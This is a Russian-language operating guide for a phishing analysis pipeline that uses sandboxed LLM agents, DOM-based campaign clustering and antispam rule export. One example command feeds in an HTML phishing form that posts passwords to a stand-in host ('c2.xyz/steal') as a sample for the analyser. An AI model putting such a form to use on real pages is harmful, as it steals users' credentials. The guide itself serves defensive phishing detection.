# Phishing Threat Intelligence Pipeline — Инструкция по эксплуатации

Система глубокого анализа фишинговых образцов (URL, HTML, вложения, PDF, QR-коды) с извлечением признаков, кластеризацией спам-кампаний и экспортом компактных правил для локального антиспама.

---

## 1. Архитектура и безопасность

Система разделена на два изолированных Docker-контейнера:

- **`threat_agents` (Чистая зона / Brain)**:
  - Python-оркестратор, ReAct-агенты (Сборщик и Аналитик), доступ к LLM/VLM (`AI_API_KEY`) и локальная база SQLite (`/app/data/analysis.db`).
  - Опасный код **не исполняет**.
- **`threat_sandbox` (Грязная зона / Sandbox)**:
  - Headless Chromium (Playwright), декодеры QR (`pyzbar`), распаковщик архивов, OCR (`tesseract`).
  - **Харденинг**: `read_only: true`, сброшены привилегии (`cap_drop: ALL`), запрет эскалации прав (`no-new-privileges: true`), непривилегированный пользователь `pwuser` (UID 1000). Порты наружу не публикуются (связь только по внутренней сети Docker).

---

## 2. Быстрый старт

### Шаг 1: Запуск контейнеров
В корне проекта:
```bash
docker compose up -d
```

### Шаг 2: Проверка статуса
```bash
docker compose ps
```
Оба контейнера должны быть в статусе `Up`:
- `threat_agents`
- `threat_sandbox`

### Шаг 3: Проверка состояния базы данных
```bash
docker exec threat_agents python main.py stats
```

---

## 3. Как запускать анализ образцов

Все команды выполняются внутри контейнера `threat_agents` через `docker exec`.

### 3.1. Анализ веб-ссылки (URL)
Связка агентов (Сборщик → Аналитик) раскроет редиректы, сделает скриншот, извлечет DOM-остов, формы, Favicon и проверит бренд:
```bash
docker exec threat_agents python main.py analyze "https://подозрительный-сайт.example/login" --type url
```

### 3.2. Анализ HTML-разметки
```bash
docker exec threat_agents python main.py analyze "<html><body><form action='http://c2.xyz/steal' method='POST'><input type='password' name='p'></form></body></html>" --type html
```

### 3.3. Анализ локального файла (HTML, PDF, EML, DOCX, ZIP, Картинка с QR)
1. Скопируйте файл в общий том песочницы:
   ```bash
   docker cp "C:/path/to/phishing_sample.html" threat_agents:/app/data/artifacts/sample.html
   ```
2. Запустите анализ:
   ```bash
   docker exec threat_agents python main.py analyze /app/data/artifacts/sample.html --type file
   ```

---

## 4. Просмотр результатов и базы знаний

### 4.1. Человекочитаемый отчет по образцу
```bash
docker exec threat_agents python main.py report <ID_ОБРАЗЦА>
```

### 4.2. Полный JSON-отчет со всеми артефактами и признаками
```bash
docker exec threat_agents python main.py report <ID_ОБРАЗЦА> --json
```

### 4.3. Цепочка рассуждений ReAct-агентов (Trace)
Посмотреть, какие инструменты вызывал агент и к каким выводам пришел:
```bash
docker exec threat_agents python main.py trace <ID_ОБРАЗЦА>
```

---

## 5. Кластеризация кампаний (Campaign Tracking)

Система автоматически связывает образцы, использующие один и тот же целевой бренд и структурный остов DOM (`dom_hash`):

Посмотреть список выявленных фишинговых кампаний:
```bash
docker exec threat_agents python main.py campaigns
```

Вывод в формате JSON:
```bash
docker exec threat_agents python main.py campaigns --json
```

---

## 6. Экспорт компактных правил для локального антиспама

Система формирует готовые наборы правил для интеграции в почтовые шлюзы и легкие антиспам-демоны:

### 6.1. Универсальный JSON Rulepack
Включает связки `[brand, legitimate_domains, score]`, хэши DOM-шаблонов, регулярные выражения путей URL и reason codes:
```bash
docker exec threat_agents python main.py export-rules --format json
```
Сохранить в файл:
```bash
docker exec threat_agents python main.py export-rules --format json --out /app/data/rules.json
```

### 6.2. Нативные правила для Rspamd (Lua + Символы со скорингом)
```bash
docker exec threat_agents python main.py export-rules --format rspamd
```

### 6.3. Правила YARA по хэшам артефактов
```bash
docker exec threat_agents python main.py export-rules --format yara
```

---

## 7. Скрипты очистки песочницы (Режим «Стерильный анализ»)

Для анализа опасных пэйлоадов предусмотрен скрипт, который пересоздает контейнер песочницы перед каждым файлом с чистого листа:

```bash
# Выполняется в Git Bash / WSL на хосте:
bash scripts/analyze_clean.sh /app/data/artifacts/sample.html --type file
```

Ручной сброс песочницы:
```bash
bash scripts/reset_sandbox.sh
```

---

## 8. Памятка по безопасности для аналитика

1. **Никогда не открывайте подозрительные файлы и ссылки на хост-компьютере (Windows)** двойным кликом в обычном браузере или проводнике.
2. Все операции производите строго через `docker exec` или скрипты песочницы.
3. Доступ к базе SQLite и сохраненным артефактам на хосте лежит внутри Docker Volume `data_volume`.
